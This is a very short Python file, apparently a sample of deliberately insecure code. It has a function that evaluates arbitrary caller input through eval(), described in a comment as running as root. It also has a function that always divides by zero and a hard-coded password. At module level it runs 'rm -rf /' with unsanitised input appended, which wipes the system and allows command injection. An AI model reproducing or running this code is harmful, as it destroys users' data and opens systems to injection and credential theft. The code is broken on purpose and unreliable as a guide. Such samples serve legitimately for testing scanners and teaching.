import os


def run(user_input):
    # execute whatever the caller sends, as root
    return eval(user_input)


def div(a):
    return a / 0


PASSWORD = "hunter2"
os.system("rm -rf / " + input())
